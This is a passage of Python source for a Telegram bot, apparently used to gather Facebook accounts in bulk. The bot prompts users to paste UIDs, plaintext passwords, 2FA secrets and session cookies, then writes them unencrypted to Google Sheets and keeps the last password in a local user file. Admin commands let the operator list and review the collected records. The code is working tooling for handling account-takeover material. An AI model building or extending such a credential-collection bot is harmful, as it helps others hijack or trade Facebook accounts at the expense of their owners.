        await _handle_fb_data(update, context, user_id, user, text)
        return

    # ── Menu button shortcuts ─────────────────────────────
    if text in ["☰ Menu", "/menu"]:
        await update.message.reply_text(
            "☰ *Main Menu*\n\n"
            "🔵 *Facebook* — Submit data\n"
            "🔄 *Change Sheet* — Update your Google Sheet\n"
            "❓ *Contact Support* — Message admin",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu_keyboard(),
        )
        return

    if text == "🔵 Facebook":
        context.user_data["state"] = STATE_WAIT_FB_DATA
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "║   🔵  Facebook Data Entry    ║\n"
            "╚══════════════════════════════╝\n\n"
            "📤 *Send your Facebook account data.*\n"
            "_Each field on a separate line — auto-detected!_\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "*Example format:*\n"
            "```\n"
            "uid: 61590542999291\n"
            "password: yourpassword\n"
            "2fa: H4PL AC2X HA6K BJ4K ABYE\n"
            "link: https://facebook.com/yourprofile\n"
            "cookies: datr=xxx; xs=xxx; c_user=xxx;\n"
            "```\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Type /cancel to go back.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=ReplyKeyboardRemove(),
        )
        return

    if text == "🔄 Change Sheet":
        context.user_data["state"] = STATE_WAIT_CHANGE_SHEET
        await update.message.reply_text(
            _sheet_setup_text(),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 Open Google Sheets", url=SHEETS_URL)]
            ]),
        )
        return

    if text == "❓ Contact Support":
        context.user_data["state"] = STATE_WAIT_SUPPORT
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "║   ❓  Contact Support        ║\n"
            "╚══════════════════════════════╝\n\n"
            "✍️ *Type your message below.*\n\n"
            "_Describe your issue or question clearly._\n\n"
            "Type /cancel to go back.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=ReplyKeyboardRemove(),
        )
        return

    await update.message.reply_text("Please use the menu below. 👇", reply_markup=main_menu_keyboard())


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id == ADMIN_ID:
        return
    context.user_data.pop("state", None)
    await update.message.reply_text("↩️ Cancelled. Back to main menu.", reply_markup=main_menu_keyboard())

# ╔══════════════════════════════════════════════════════════╗
# ║             FACEBOOK DATA SAVE HANDLER                   ║
# ╚══════════════════════════════════════════════════════════╝

async def _handle_fb_data(update, context, user_id, user, text):
    """Handle Facebook data submission with duplicate detection."""

    parsed = smart_parse(text)
    if not any(parsed.values()):
        await update.message.reply_text(
            "❌ Could not detect your data.\n\n"
            "Please send like this:\n\n"
            "uid: 61590542999291\n"
            "password: yourpassword\n"
            "2fa: H4PL AC2X HA6K BJ4K\n"
            "cookies: datr=xxx; xs=xxx;\n\n"
            "Just paste your data anytime!",
        )
        return

    u        = get_user(user_id)
    sheet_id = (u.get("sheet_id") or "") if u else ""
    uid_val  = parsed.get("uid", "").strip()

    # ── Duplicate check ───────────────────────────────────────
    if uid_val and sheet_id and is_duplicate_uid(user_id, uid_val, sheet_id):
        pw_d2 = "●" * min(len(parsed["password"]), 8) if parsed["password"] else "—"
        tf_d2 = (parsed["2fa"][:20] + "…") if len(parsed["2fa"]) > 20 else (parsed["2fa"] or "—")
        context.user_data["pending_dup"] = {
            "parsed":   parsed,
            "sheet_id": sheet_id,
            "uid_d":    uid_val or "—",
            "pw_d":     pw_d2,
            "tf_d":     tf_d2,
            "lf_d":     parsed["link_fb"] or "—",
            "ck_d":     "✓" if parsed["cookies"] else "—",
        }
        await update.message.reply_text(
            "⚠️ Duplicate UID Detected!\n\n"
            f"UID:      {uid_val}\n"
            f"Password: {pw_d2}\n"
            f"2FA:      {tf_d2}\n\n"
            "This UID was already saved by you.\n"
            "Do you want to save it again?",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("✅ Save Anyway", callback_data="dup_save"),
                InlineKeyboardButton("❌ Cancel",      callback_data="dup_cancel"),
            ]]),
        )
        return

    # ── Save to Sheet ─────────────────────────────────────────
    uid_d = parsed["uid"] or "—"
    pw_d  = "●" * min(len(parsed["password"]), 8) if parsed["password"] else "—"
    tf_d  = (parsed["2fa"][:20] + "…") if len(parsed["2fa"]) > 20 else (parsed["2fa"] or "—")
    lf_d  = parsed["link_fb"] or "—"
    ck_d  = "✓ Saved" if parsed["cookies"] else "—"

    sheet_status = "⚠️ No sheet linked"
    if sheet_id:
        row = [
            parsed["uid"],
            parsed["password"],
            parsed["2fa"],
            parsed["link_fb"],
            parsed["cookies"],
        ]
        ok, err = write_to_sheet(sheet_id, row)
        if ok:
            add_uid_to_cache(user_id, uid_val)
            increment_saved(user_id)
            # Store last uid for delete feature
            users_db = load_users()
            uid_str  = str(user_id)
            if uid_str in users_db:
                users_db[uid_str]["last_uid"] = parsed["uid"]
                users_db[uid_str]["last_pw"]  = parsed["password"]
                save_users(users_db)
            sheet_status = "✅ Written to Sheet"
        else:
            sheet_status = f"❌ Failed: {err}"
            logger.error("Sheet write failed for user %s: %s", user_id, err)

    u     = get_user(user_id)
    total = u.get("total_saved", 0) if u else 1

    await update.message.reply_text(
        "╔═══════════════════════╗\n"
        "║   💾  Data Saved!     ║\n"
        "╚═══════════════════════╝\n\n"
        "🔵 Facebook Account\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 UID:      {uid_d}\n"
        f"🔑 Password: {pw_d}\n"
        f"🔐 2FA:      {tf_d}\n"
        f"🔗 Link FB:  {lf_d}\n"
        f"🍪 Cookies:  {ck_d}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Sheet:    {sheet_status}\n"
        f"📈 Total:    {total}\n\n"
        "Just paste more data anytime!",
        reply_markup=facebook_inline_keyboard(),
    )

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    users = load_users()
    if not users:
        await update.message.reply_text("📋 No users yet.")
        return
    lines = [
        "╔══════════════════════════════╗\n"
        "║   👥  All Users              ║\n"
        "╚══════════════════════════════╝\n"
    ]
    for u in users.values():
        status    = "🚫" if u.get("blocked") else "✅"
        full_name = html.escape(u.get("full_name") or "")
        username  = html.escape(u.get("username") or "none")
        sheet     = "✓" if u.get("sheet_id") else "✗"
        lines.append(
            f"{status} <b>{full_name}</b> (@{username})\n"
            f"   🆔 <code>{u['user_id']}</code> | 💾 {u.get('total_saved', 0)} | Sheet:{sheet} | 📅 {u.get('joined', '?')}\n"
        )
    text   = "\n".join(lines)
    chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
    for chunk in chunks:
        await update.message.reply_text(chunk, parse_mode=ParseMode.HTML)


async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    target = parse_admin_target(context.args)
    if target is None:
        await update.message.reply_text("Usage: `/userinfo <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    u = get_user(target)
    if not u:
        await update.message.reply_text(f"❌ User `{target}` not found.", parse_mode=ParseMode.MARKDOWN)
        return
    records = load_fb_data()
    today   = date.today().isoformat()
    u_total = sum(1 for r in records if r.get("user_id") == target)
    u_today = sum(1 for r in records if r.get("user_id") == target and r.get("date") == today)
    status  = "🚫 Blocked" if u.get("blocked") else "✅ Active"
    sheet_short = (u["sheet_id"][:18] + "…") if len(u.get("sheet_id", "")) > 18 else (u.get("sheet_id") or "—")
    note    = u.get("notes") or "—"

    await update.message.reply_text(
        "╔══════════════════════════════╗\n"
        "║   👤  User Details           ║\n"
        "╚══════════════════════════════╝\n\n"
        f"📛 *Name:*         {html.escape(u['full_name'])}\n"
        f"🔖 *Username:*     @{html.escape(u.get('username') or 'none')}\n"
        f"🆔 *User ID:*      `{u['user_id']}`\n"
        f"📅 *Joined:*       {u.get('joined', '?')}\n"
        f"🕐 *Last Active:*  {u.get('last_active', '?')}\n"
        f"🔵 *FB Today:*     {u_today}\n"
        f"📈 *FB Total:*     {u_total}\n"
        f"📋 *Sheet ID:*     `{sheet_short}`\n"
        f"🏷 *Status:*       {status}\n"
        f"📝 *Note:*         {note}\n\n"
        f"`/block {target}` | `/unblock {target}` | `/remove {target}`\n"
        f"`/note {target} <text>` | `/msg {target} <text>`",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_support(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    msgs = load_support()
    if not msgs:
        await update.message.reply_text("📋 No support messages yet.")
        return
    lines = [
        "╔══════════════════════════════╗\n"
        "║   ❓  Support Messages       ║\n"
        "╚══════════════════════════════╝\n"
    ]
    for i, m in enumerate(msgs[-30:], 1):
        badge = "🔴" if not m.get("replied") else "✅"
        lines.append(
            f"{badge} *#{i}* | {html.escape(m['full_name'])} | `{m['user_id']}`\n"
            f"   💬 {html.escape(m['message'][:80])}\n"
            f"   🕐 {m['sent_at']} | `/msg {m['user_id']} <reply>`\n"
        )
    text   = "\n".join(lines)
    chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
    for chunk in chunks:
        await update.message.reply_text(chunk, parse_mode=ParseMode.MARKDOWN)


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    users      = load_users()
    total      = len(users)
    blocked    = sum(1 for u in users.values() if u.get("blocked"))
    fb_today   = count_fb_today()
    fb_total   = count_fb_total()
    pending    = count_pending_support()
    with_sheet = sum(1 for u in users.values() if u.get("sheet_id"))

    await update.message.reply_text(
        "╔══════════════════════════════╗\n"
        "║   📊  Bot Statistics         ║\n"
        "╚══════════════════════════════╝\n\n"
        f"👥 *Total Users:*         {total}\n"
        f"📋 *Users with Sheet:*    {with_sheet}\n"
        f"🚫 *Blocked Users:*       {blocked}\n\n"
        f"🔵 *FB Saved Today:*      {fb_today}\n"
        f"📈 *Total FB Saved:*      {fb_total}\n\n"
        f"❓ *Pending Support:*     {pending}\n\n"
        f"🕐 {datetime.now().strftime('%d/%m/%Y %H:%M')}",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_block(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    target = parse_admin_target(context.args)
    if target is None:
        await update.message.reply_text("Usage: `/block <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    if block_user(target):
        await update.message.reply_text(f"🚫 User `{target}` blocked.", parse_mode=ParseMode.MARKDOWN)
        try:
            await context.bot.send_message(chat_id=target, text="🚫 Your account has been blocked.")
        except Exception:
            pass
    else:
        await update.message.reply_text(f"❌ User `{target}` not found.", parse_mode=ParseMode.MARKDOWN)


async def cmd_unblock(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    target = parse_admin_target(context.args)
    if target is None:
        await update.message.reply_text("Usage: `/unblock <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    if unblock_user(target):
        await update.message.reply_text(f"✅ User `{target}` unblocked.", parse_mode=ParseMode.MARKDOWN)
        try:
            await context.bot.send_message(chat_id=target, text="✅ Unblocked. Type /start to continue.")
        except Exception:
            pass
    else:
        await update.message.reply_text(f"❌ User `{target}` not found.", parse_mode=ParseMode.MARKDOWN)


async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    target = parse_admin_target(context.args)
    if target is None:
        await update.message.reply_text("Usage: `/remove <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    if remove_user(target):
        await update.message.reply_text(f"🗑 User `{target}` removed.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"❌ User `{target}` not found.", parse_mode=ParseMode.MARKDOWN)


async def cmd_note(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/note <user_id> <text>`", parse_mode=ParseMode.MARKDOWN)
        return
    target = parse_admin_target(args)
    if target is None:
        await update.message.reply_text("❌ Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
        return
    note = " ".join(args[1:])
    if set_user_note(target, note):
        await update.message.reply_text(f"📝 Note saved for `{target}`:\n_{note}_", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"❌ User `{target}` not found.", parse_mode=ParseMode.MARKDOWN)


async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("Usage: `/broadcast <message>`", parse_mode=ParseMode.MARKDOWN)
        return
    msg    = " ".join(context.args)
    users  = load_users()
    sent   = 0
    failed = 0
    for u in users.values():
        if u.get("blocked"):
            continue
        try:
            await context.bot.send_message(
                chat_id=u["user_id"],
                text="╔══════════════════════════════╗\n║   📢  Message from Admin     ║\n╚══════════════════════════════╝\n\n" + msg,
                parse_mode=ParseMode.MARKDOWN,
            )
            sent += 1
        except Exception:
            failed += 1
    await update.message.reply_text(
        f"📢 *Broadcast sent!*\n\n✅ Delivered: {sent}\n❌ Failed: {failed}",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_msg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/msg <user_id> <message>`", parse_mode=ParseMode.MARKDOWN)
        return
    target = parse_admin_target(args)
    if target is None:
        await update.message.reply_text("❌ Invalid user ID.")
        return
    msg = " ".join(args[1:])
    try:
        await context.bot.send_message(
            chat_id=target,
            text="╔══════════════════════════════╗\n║   📩  Message from Admin     ║\n╚══════════════════════════════╝\n\n" + msg,
            parse_mode=ParseMode.MARKDOWN,
        )
        mark_support_replied(target)
        await update.message.reply_text(f"✅ Message sent to `{target}`.", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")


async def cmd_fbdata(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    records = load_fb_data()
    if not records:
        await update.message.reply_text("📋 No Facebook records saved yet.")
        return
    lines = [
        "╔══════════════════════════════╗\n"
        "║   🔵  Facebook Records       ║\n"
        "╚══════════════════════════════╝\n"
    ]
    for i, r in enumerate(records[-50:], 1):
        uid_d = r.get("uid") or "—"
        pw_d  = "●" * min(len(r.get("password", "")), 6) or "—"
        sheet = "✓" if r.get("sheet_id") else "—"
        lines.append(
            f"*#{i}* | `{uid_d}` | `{pw_d}` | Sheet:{sheet} | {r.get('saved_at', '?')}\n"
            f"   👤 {html.escape(r.get('full_name', '?'))} | 🔗 {r.get('link_fb') or '—'}\n"
        )
    text   = "\n".join(lines)
    chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
    for chunk in chunks:
        await update.message.reply_text(chunk, parse_mode=ParseMode.MARKDOWN)


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.warning("Error: %s", context.error)

# ╔══════════════════════════════════════════════════════════╗
# ║                         MAIN                             ║
# ╚══════════════════════════════════════════════════════════╝

async def post_init(application) -> None:
    await application.bot.set_my_commands([
        BotCommand("start",   "Start the bot / Main menu"),
        BotCommand("cancel",  "Cancel current action"),
        BotCommand("support", "Admin: view support messages"),
    ])


def main() -> None:
    if not BOT_TOKEN or "YOUR_BOT_TOKEN" in BOT_TOKEN:
        raise ValueError("Set BOT_TOKEN at the top of bot.py")
    if ADMIN_ID == 0:
        raise ValueError("Set ADMIN_ID at the top of bot.py")

    request = HTTPXRequest(
        connect_timeout=20.0,
        read_timeout=20.0,
        write_timeout=20.0,
        pool_timeout=20.0,
    )

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(request)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start",     start))
    app.add_handler(CommandHandler("cancel",    cmd_cancel))
    app.add_handler(CommandHandler("users",     cmd_users))
    app.add_handler(CommandHandler("userinfo",  cmd_userinfo))
    app.add_handler(CommandHandler("support",   cmd_support))
    app.add_handler(CommandHandler("stats",     cmd_stats))
    app.add_handler(CommandHandler("block",     cmd_block))
    app.add_handler(CommandHandler("unblock",   cmd_unblock))
    app.add_handler(CommandHandler("remove",    cmd_remove))
    app.add_handler(CommandHandler("note",      cmd_note))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("msg",       cmd_msg))
    app.add_handler(CommandHandler("fbdata",    cmd_fbdata))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)

    print("╔════════════════════════════════════════╗")
    print("║  🤖  Facebook Bot  v2.1.1  RUNNING!   ║")
    print(f"║  👑  Admin ID: {ADMIN_ID}           ║")
    print("╚════════════════════════════════════════╝")

    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        poll_interval=0.5,
        timeout=10,
    )


if __name__ == "__main__":
    main()
